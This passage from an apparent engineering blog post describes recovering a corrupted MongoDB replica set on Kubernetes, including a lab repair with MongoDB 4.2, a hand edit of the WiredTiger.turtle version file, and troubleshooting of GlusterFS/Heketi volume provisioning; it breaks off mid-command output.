At this point we were facing a few of problems:</p>
<ol>
<li>We could not create a mongodump since the MongoDB server was not running and the <code>initContainers</code> were in a <code>CrashLoopBackOff</code>.</li>
<li>We did not have the necessary tools on the production environment since we could not install any additional sidecar containers or utilities.</li>
<li>As mentioned earlier, we did not have a snapshot of the server in a working state or a <code>mongodump</code> to rely on so we needed to figure out a way to fix this corrupted state somehow.</li>
</ol>
<p>Luckily, the environment did have a <code>Deployment</code> called <code>system-recovery</code> which allowed us access to the mounted storage points so we could access the MongoDB flat files. We could then take these flat files, compress them and transfer them to our lab environment to attempt recovery:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> kubectl scale deployment system-recovery </span><span class="token parameter variable" style="color:#36acaa">--replicas</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">deployment.apps/system-recovery scaled</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> kubectl </span><span class="token function" style="color:#d73a49">cp</span><span class="token plain"> system-recovery-4184bfa40da-sah4131:/mongodb0 /tmp/mongodb0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">tar</span><span class="token plain"> czvf /tmp/mongodb0.tar.gz /tmp/mongodb0</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>In our lab, we attempted to load MongoDB with the <code>--repair</code> flag but saw that it was failing with the same error we saw earlier on the production environment:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> mongod </span><span class="token parameter variable" style="color:#36acaa">--version</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">3.6</span><span class="token plain">.8</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> mongod </span><span class="token parameter variable" style="color:#36acaa">--dbpath</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">/tmp/mongodb0 </span><span class="token parameter variable" style="color:#36acaa">--repair</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">E STORAGE  WiredTiger error, file:WiredTiger.wt, connection: This may be due to the database files being encrypted, being from an older version or due to corruption on disk</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>We found out, after further research, that <a href="https://jira.mongodb.org/browse/SERVER-19815" target="_blank" rel="noopener noreferrer">MongoDB version 4 had a more robust repairing mechanism of corrupted WiredTiger schemas</a>. So we installed MongoDB 4 in our lab environment and reran the same repair:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> mongod </span><span class="token parameter variable" style="color:#36acaa">--version</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">4.2</span><span class="token plain">.2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> mongod </span><span class="token parameter variable" style="color:#36acaa">--dbpath</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">/tmp/mongodb0 </span><span class="token parameter variable" style="color:#36acaa">--repair</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>We received a message that the operation was successful!
So now that we had a repaired MongoDB, we wanted to create a <code>mongodump</code> and then attempt to load the database in the lab environment to check whether the dependent Pods will successfully load which would mean that the application would load as well.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="mongodb-version-conflict">MongoDB Version Conflict<a href="https://kbbgl.github.io/blog/prod-down-mongodb-corrupt-heketi-glusterfs-provisioning#mongodb-version-conflict" class="hash-link" aria-label="Direct link to MongoDB Version Conflict" title="Direct link to MongoDB Version Conflict">​</a></h2>
<p>Earlier, When attempting to repair the MongoDB, we needed to run the MongoDB server with version 4+ because of the new repair mechanism offered. The actual data which we extracted from the production environment was from version 3.6.8. We didn’t think this would be a problem until we actually attempted to load the database in order to generate a <code>mongodump</code>:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> mongod </span><span class="token parameter variable" style="color:#36acaa">--version</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">3.6</span><span class="token plain">.8</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> mongod </span><span class="token parameter variable" style="color:#36acaa">--dbpath</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">/tmp/mongodb0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Found an invalid featureCompatibilityVersion document </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ERROR: BadValue: Invalid value </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> version, found </span><span class="token number" style="color:#36acaa">3.6</span><span class="token plain">, expected </span><span class="token string" style="color:#e3116c">'4.2'</span><span class="token plain"> or </span><span class="token string" style="color:#e3116c">'4.0'</span><span class="token builtin class-name">.</span><span class="token plain"> Contents of featureCompatibilityVersion document </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> admin.system.version: </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"> _id: </span><span class="token string" style="color:#e3116c">"featureCompatibilityVersion"</span><span class="token plain">, version: </span><span class="token string" style="color:#e3116c">"3.6"</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain">. See http://dochub.mongodb.org/core/4.0-feature-compatibility.</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">. If the current featureCompatibilityVersion is below </span><span class="token number" style="color:#36acaa">4.0</span><span class="token plain">, see the documentation on upgrading at </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>We were now blocked because MongoDB server and the actual data were different versions. We could not run the command:</p>
<div class="language-javascript codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-javascript codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">db</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">setFeatureCompatibility</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">{</span><span class="token literal-property property" style="color:#36acaa">_id</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> version</span><span class="token string" style="color:#e3116c">"3.6"</span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>as suggested by a few different StackOverflow articles and MongoDB official documentation since we would need to be able to run the database.</p>
<p>This was really bad news since we did not know where this feature flag was actually stored, whether it was stored in clear text and if it was accessible. We decided to run a quick search within all the flat files in the MongoDB directory. It was a shot in the dark but we didn’t really have any other options at this point.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">grep</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-rnwi</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"compatibility"</span><span class="token plain"> ./mongodb0/*</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WiredTiger.turtle:1:Compatibility version</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>We managed to find something interesting within the WiredTiger.turtle file which was clear text. The whole file contents looked like this:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Compatibility version</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">major=4,minor=2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WiredTiger version string</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WiredTiger 4.2.1: (September 15, 2019)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WiredTiger version</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">major=4,minor=2,patch=1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Since we were in dire straits, we decided it was worth to modify the versions in this file and see if we could work around the MongoDB server validation. We modified it to the following:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Compatibility version</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">major=3,minor=6</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WiredTiger version string</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WiredTiger 3.6.8: (July 12, 2018)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WiredTiger version</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">major=3,minor=6,patch=8</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Miraculously, when running MongoDB daemon again, we were able to load the database and the application! We created a dump file using <code>mongodump</code> and transferred it to the production environment.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="fixing-unhealthy-glusterfsheketi">Fixing Unhealthy GlusterFS/Heketi<a href="https://kbbgl.github.io/blog/prod-down-mongodb-corrupt-heketi-glusterfs-provisioning#fixing-unhealthy-glusterfsheketi" class="hash-link" aria-label="Direct link to Fixing Unhealthy GlusterFS/Heketi" title="Direct link to Fixing Unhealthy GlusterFS/Heketi">​</a></h2>
<p>We reconnected to the production environment, transferred the repaired and generated <code>mongodump</code> and we needed to somehow restore it onto the shared storage. We saw three possible ways of performing this:</p>
<ol>
<li>Modify the MongoDB <code>StateFulSet</code> specification by changing the executed commands to something like an infinite sleep so that the <code>bootstrap</code> <code>initContainer</code> would not terminate. This would allow us to copy the <code>mongodump</code> into the container and run <code>mongorestore</code> to load the repaired databased and ensure it’s replicated across all GlusterFS storage locations. This was the preferred option.</li>
<li>Replace all MongoDB flat files manually within each one of the GlusterFS shared storage locations. This would not be ideal since it would go against MongoDB replication best practices.</li>
<li>Removing all GlusterFS <code>PersistentVolumeClaims</code>, recreate them from scratch and then bind them to the MongoDB replica set members.</li>
</ol>
<p>After reviewing all three options, we decided to go with the 3rd approach. It was decided as the best option after consulting with our DevOps because they mentioned that they have set up dynamic storage allocation upon removal of the GlusterFS <code>PersistenVolumeClaims</code> and restart of the MongoDB <code>StateFulSet</code> <code>Pod</code>s.
The first step would be to delete the <code>PersistentVolumeClaims</code>. So we went to work.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> kubectl delete pvc datadir-mongodb-replicaset-0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> kubectl delete pvc datadir-mongodb-replicaset-1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> kubectl delete pvc datadir-mongodb-replicaset-2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>But we noticed that these pvcs were stuck on Terminating. We even attempted to force delete them but they were still stuck:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> kubectl delete pvc datadir-mongodb-replicaset-0 </span><span class="token parameter variable" style="color:#36acaa">--force</span><span class="token plain"> --grace-period </span><span class="token number" style="color:#36acaa">0</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>After some research, we found out that these PersistentVolumeClaim specs had <a href="https://kubernetes.io/docs/tasks/extend-kubernetes/custom-resources/custom-resource-definitions/#finalizers" target="_blank" rel="noopener noreferrer"><code>finalizers</code></a>:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> kubectl describe pvc datadir-mongodb-replicaset-0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Name:          datadir-mongodb-replicaset-0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Namespace:     prod</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">StorageClass:  gluster</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Status:        Bound</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Volume:        pvc-64340467-8109-4856-9a49-2fc36563e9ab</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Labels:        </span><span class="token assign-left variable" style="color:#36acaa">app</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">mongodb-replicaset</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Annotations:   pv.kubernetes.io/bind-completed: </span><span class="token function" style="color:#d73a49">yes</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pv.kubernetes.io/bound-by-controller: </span><span class="token function" style="color:#d73a49">yes</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;volume.beta.kubernetes.io/storage-provisioner: kubernetes.io/glusterfs</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Finalizers:    </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">kubernetes.io/pvc-protection</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Capacity:      150Gi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Access Modes:  RWO</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">VolumeMode:    Filesystem</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Mounted By:    mongodb-replicaset-0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Events:        </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">none</span><span class="token operator" style="color:#393A34">&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>We edited the <code>PVC</code>s with:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">kubectl edit pvc datadir-mongodb-replicaset-0</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>removed the <code>finalizer</code> section and reran the <code>kubectl delete pvc</code> commands. This resulted in a successful deletion. We then deleted the MongoDB <code>StateFulSet</code> to generate the <code>PVC</code>s using <code>kubectl delete pod mongodb-replicaset-{0,1,2}</code>. But to our surprise, the <code>PVC</code> and the <code>Pod</code>s were stuck <code>Pending</code>. Something was preventing the dynamic <code>PVC</code> allocation.</p>
<p>When we ran <code>kubectl describe pvc datadir-mongodb-replicaset-0</code> we saw that there was an <code>Event</code> with <code>ProvisioningFailed</code> with the following error message:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> kubectl describe pvc datadir-mongodb-replicaset-0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Failed to provision volume with StorageClass </span><span class="token string" style="color:#e3116c">"gluster"</span><span class="token builtin class-name">:</span><span class="token plain"> failed to create volume.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>The error message was far from informative so we needed to step back and review the state of <code>heketi</code> and <code>glusterfs</code>. We noticed that neither the <code>glusterfs</code> or the <code>heketi</code> <code>Pod</code>s had any logs from standard output and all of them, according to <code>kubectl get pods -n storage</code>, were in healthy, <code>Running</code> state.</p>
<p>We decided it would be best to use the <code>gluster</code> CLI and try to troubleshoot why the provisioning is failing. Luckily, the issue was pretty easy to find. We accessed the <code>glusterfs</code> Pod and ran the following command to check the status of <code>heketidbstorage</code>:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> kubectl </span><span class="token builtin class-name">exec</span><span class="token plain"> glusterfs-k96d2 </span><span class="token parameter variable" style="color:#36acaa">-it</span><span class="token plain"> -- </span><span class="token function" style="color:#d73a49">bash</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">ec2-user@node1 /</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> gluster volume status heketidbstorage</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Status of volume: heketidbstorage</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Gluster process TCP Port RDMA Port Online Pid</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">------------------------------------------------------------------------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Brick node1:/var/lib/heketi/mounts/vg</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">_4a5d18544111232fc76cdc9872d340d6/brick_75c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ec7af846fbf2e770b9312c6bc56fe/brick </span><span class="token number" style="color:#36acaa">49152</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> N </span><span class="token number" 